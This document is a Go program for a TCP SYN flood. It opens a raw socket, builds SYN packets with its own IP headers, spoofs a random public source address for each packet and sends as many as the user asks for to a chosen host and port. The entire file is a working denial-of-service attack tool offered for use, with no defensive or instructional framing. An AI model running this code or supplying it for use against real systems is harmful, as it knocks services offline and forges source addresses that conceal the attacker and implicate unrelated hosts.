package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"syscall"
)

func main() {
	if len(os.Args) != 5 {
		log.Fatalf("Usage: %s <interface> <host> <port> <packets>", os.Args[0])
	}

	host := os.Args[2]
	port, err := strconv.Atoi(os.Args[3])
	if err != nil {
		log.Fatalf("Invalid port: %v", err)
	}
	packets, err := strconv.Atoi(os.Args[4])
	if err != nil {
		log.Fatalf("Invalid number of packets: %v", err)
	}

	dstIP := net.ParseIP(host)
	dstPort := uint16(port)

	for i := 0; i < packets; i++ {
		srcIP := generateRandomPublicIP()
		sendTCPSYN(srcIP, dstIP, dstPort)
	}
}

func sendTCPSYN(srcIP string, dstIP net.IP, dstPort uint16) {
	// Create raw socket
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		log.Fatalf("Failed to create socket: %v", err)
	}
	defer syscall.Close(fd)

	// Set the IP_HDRINCL option so that we can specify our own IP header.
	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		log.Fatalf("Failed to set IP_HDRINCL: %v", err)
	}

	// Build TCP SYN packet
	packet := makeTCPSYNPacket(srcIP, dstIP, dstPort)

	// Specify the destination address structure
	addr := syscall.SockaddrInet4{
		Port: int(dstPort),
		Addr: [4]byte{dstIP[0], dstIP[1], dstIP[2], dstIP[3]},
	}

	// Send packet
	if err := syscall.Sendto(fd, packet, 0, &addr); err != nil {
		log.Fatalf("Failed to send packet: %v", err)
	}
}

func makeTCPSYNPacket(srcIP string, dstIP net.IP, dstPort uint16) []byte {

	var packet []byte

	// Simplified IP header
	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45                            // Version and IHL
	ipHeader[1] = 0x00                            // Type of Service
	binary.BigEndian.PutUint16(ipHeader[2:4], 40) // Total length
	binary.BigEndian.PutUint16(ipHeader[4:6], 1)  // Identification
	binary.BigEndian.PutUint16(ipHeader[6:8], 0)  // Flags and Fragment Offset
	ipHeader[8] = 64                              // TTL
	ipHeader[9] = 6                               // Protocol (TCP)
	// Header checksum will be calculated later
	copy(ipHeader[12:16], net.ParseIP(srcIP).To4()) // Source IP
	copy(ipHeader[16:20], dstIP.To4())              // Destination IP

	// Simplified TCP header
	tcpHeader := make([]byte, 20)
	binary.BigEndian.PutUint16(tcpHeader[0:2], uint16(rand.Intn(64512)+1024)) // Source port
	binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort)                       // Target port
	binary.BigEndian.PutUint32(tcpHeader[4:8], 0)                             // Sequence number
	binary.BigEndian.PutUint32(tcpHeader[8:12], 0)                            // Acknowledgement number
	tcpHeader[12] = 0x50                                                      // Data offset and reserved bits
	tcpHeader[13] = 0x02                                                      // Flags (SYN)
	binary.BigEndian.PutUint16(tcpHeader[14:16], 14600)                       // Window size
	// Checksum and urgent pointer will be calculated later

	// Add the pseudo-header for checksum calculation
	pseudoHeader := makePseudoHeader(srcIP, dstIP, 6, uint16(len(tcpHeader)))
	checksumData := append(pseudoHeader, tcpHeader...)
	binary.BigEndian.PutUint16(tcpHeader[16:18], calculateChecksum(checksumData)) // Checksum

	packet = append(ipHeader, tcpHeader...)
	return packet
}

func makePseudoHeader(srcIP string, dstIP net.IP, protocol uint8, tcpLength uint16) []byte {
	pseudoHeader := make([]byte, 12)
	copy(pseudoHeader[0:4], net.ParseIP(srcIP).To4()) // Source IP
	copy(pseudoHeader[4:8], dstIP.To4())              // Target IP
	pseudoHeader[8] = 0                               // Reserved
	pseudoHeader[9] = protocol
	binary.BigEndian.PutUint16(pseudoHeader[10:12], tcpLength) // TCP length

	return pseudoHeader
}

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8 // Add last byte if length is odd
	}
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	return uint16(^sum)
}

func isPrivateIP(oct1, oct2 int) bool {
	if oct1 == 10 {
		return true
	}
	if oct1 == 172 && (oct2 >= 16 && oct2 <= 31) {
		return true
	}
	if oct1 == 192 && oct2 == 168 {
		return true
	}
	if oct1 == 127 {
		return true
	}
	if oct1 == 169 && oct2 == 254 {
		return true
	}
	return false
}

func generateRandomPublicIP() string {
	var oct1, oct2 int
	for {
		oct1 = rand.Intn(256)
		oct2 = rand.Intn(256)
		if !isPrivateIP(oct1, oct2) {
			break
		}
	}
	return fmt.Sprintf("%d.%d.%d.%d",
		oct1,
		oct2,
		rand.Intn(256),
		rand.Intn(256))
}
